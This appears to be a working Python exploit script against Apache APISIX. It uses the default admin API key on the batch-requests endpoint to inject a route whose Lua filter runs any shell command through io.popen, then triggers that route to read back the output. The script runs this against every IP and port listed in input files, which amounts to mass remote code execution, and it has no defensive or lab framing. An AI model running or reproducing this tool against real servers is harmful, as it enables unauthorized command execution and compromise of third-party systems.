import requests
import json
import argparse
import urllib3
import os

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def build_payload(cmd):
    lua_payload = (
        f"function(vars) "
        f"local handle = io.popen('{cmd}'); "
        f"local result = handle:read('*a'); "
        f"handle:close(); "
        f"ngx.say(result); "
        f"return true end"
    )
    return lua_payload

def exploit(domain, port, cmd):
    # 确保端口是字符串并去掉空格
    domain = domain.strip()
    port = str(port).strip()
    
    url = f"http://{domain}:{port}/apisix/batch-requests"

    headers = {
        "Host": f"{domain}:{port}",
        "User-Agent": "Mozilla/5.0",
        "X-API-KEY": "edd1c9f034335f136f87ad84b625c8f1",
        "Content-Type": "application/json",
        "Accept": "*/*",
        "Connection": "close"
    }

    lua_payload = build_payload(cmd)

    body = {
        "headers": {
            "X-Real-IP": f"{domain}:{port}",
            "X-API-KEY": "edd1c9f034335f136f87ad84b625c8f1",
            "Content-Type": "application/json"
        },
        "timeout": 1500,
        "pipeline": [
            {
                "path": "/apisix/admin/routes/index",
                "method": "PUT",
                "body": json.dumps({
                    "uri": "/rms/fzxewh",
                    "name": "custom_rce",
                    "filter_func": lua_payload,
                    "upstream": {
                        "type": "roundrobin",
                        "nodes": {
                            "127.0.0.1": 1
                        }
                    }
                })
            }
        ]
    }

    try:
        print(f"[*] Testing {domain}:{port} ...")
        # 设置较短的 timeout 防止卡死
        resp = requests.post(url, headers=headers, json=body, verify=False, timeout=10)

        if resp.status_code == 200:
            print(f"[+] {domain}:{port} - Route injected successfully.")
            
            trigger_url = f"http://{domain}:{port}/rms/fzxewh"
            r = requests.get(trigger_url, headers=headers, verify=False, timeout=10)
            print(f"[+] {domain}:{port} Response:\n{r.text}")
        else:
            print(f"[-] {domain}:{port} - Injection failed (Status: {resp.status_code})")
            
    except requests.exceptions.RequestException as e:
        print(f"[!] {domain}:{port} - Connection Error")

def main():
    parser = argparse.ArgumentParser(description="Apache APISIX Batch RCE")
    parser.add_argument('-c', '--cmd', required=True, help='Command to execute')
    args = parser.parse_args()

    # 检查文件是否存在
    if not os.path.exists('ip.txt') or not os.path.exists('port.txt'):
        print("错误: 找不到 ip.txt 或 port.txt 文件")
        return

    # 读取 IP 列表
    with open('ip.txt', 'r') as f:
        ips = [line.strip() for line in f if line.strip()]

    # 读取 端口 列表
    with open('port.txt', 'r') as f:
        ports = [line.strip() for line in f if line.strip()]

    print(f"开始扫描: 共有 {len(ips)} 个IP, {len(ports)} 个端口")

    # 遍历 IP 和 端口
    for ip in ips:
        for port in ports:
            exploit(ip, port, args.cmd)

if __name__ == '__main__':
    main()